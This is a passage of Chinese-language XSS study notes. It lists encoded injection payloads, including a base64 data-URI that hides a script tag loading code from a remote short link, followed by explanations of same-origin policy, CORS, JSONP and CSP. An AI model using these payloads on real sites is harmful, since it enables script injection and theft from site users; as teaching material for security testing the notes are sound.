5.HTML编码：

<img src='1' onerror='aler&#x0074;(1)'>

6.base64编码（仅data支持）

     <object data="data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cDovL3QuY24vUnE5bjZ6dT48L3NjcmlwdD4="></object>
     格式：
     Data:<mime type>,<encoded data>
     Data                //协议
     <mime type>         //数据类型
     charset=<charset>   //指定编码
     [;base64]           //被指定的编码
     <encoded data>      //定义data协议的编码
     特点：不支持IE


```

- - 存在json数据解析 context： `<?=json_encode($_GET['x'])?>` 
  - payload： `?x=<img+src=x+onerror=ö-alert(1)>`

- - SVG 标签

当返回结果在 svg 标签中的时候，会有一个特性 `<svg><script>varmyvar="YourInput";</script></svg>` YourInput 可控，输入 `www.site.com/test.php?var=text";alert(1)//` 如果把 “ 编码一些他仍然能够执行: `<svg><script>varmyvar="text&quot;;alert(1)//";</script></svg>`

## 域、同源策略、CORS、JSONP

**1）同源策略**

A网页设置的Cookie，B网页不能打开，除非这两个网页"同源"。所谓“同源”指的是“三个相同”：

```
•协议相同
•域名相同
•端口相同
```

如果非同源，共有三种行为受到限制。

```
（1）Cookie、LocalStorage和IndexDB无法读取。
（2）DOM无法获得。
（3）AJAX请求不能发送。（非CORS下）
```

**2）跨域请求**

同源政策规定，AJAX请求只能发给同源的网址，否则就报错。除了架设服务器代理（浏览器请求同源服务器，再由后者请求外部服务），有三种方法规避这个限制：

```
•JSONP:网页通过添加一个<script>元素，通过src属性向服务器请求JSON数据，这种做法不受同源策略限制；服务器收到请求后，将数据放在一个指定名字的回调函数里传回来。
•WebSocket：HTML5 开始提供的一种在单个 TCP 连接上进行全双工通讯的协议。
•CORS：允许浏览器向跨源(协议 + 域名 + 端口)服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制。
•Flash URLLoader:【post+get】
```

**3）CSP**

CSP全称为Content Security Policy，通过CSP所约束的的规责指定可信的内容来源（这里的内容可以指脚本、图片、iframe、font、style等等可能的远程的资源）。


- **参考**

《XSS测试备忘录》`http://momomoxiaoxi.com/2017/10/10/XSS/`

（360安全客）深入理解浏览器解析机制和XSS向量编码

WEBKIT中的HTML词法解析 `https://blog.csdn.net/dlmu2001/article/details/5998130`



## 技巧搜集

[输入长度受限情况下的 XSS 攻击](https://xz.aliyun.com/t/3513)

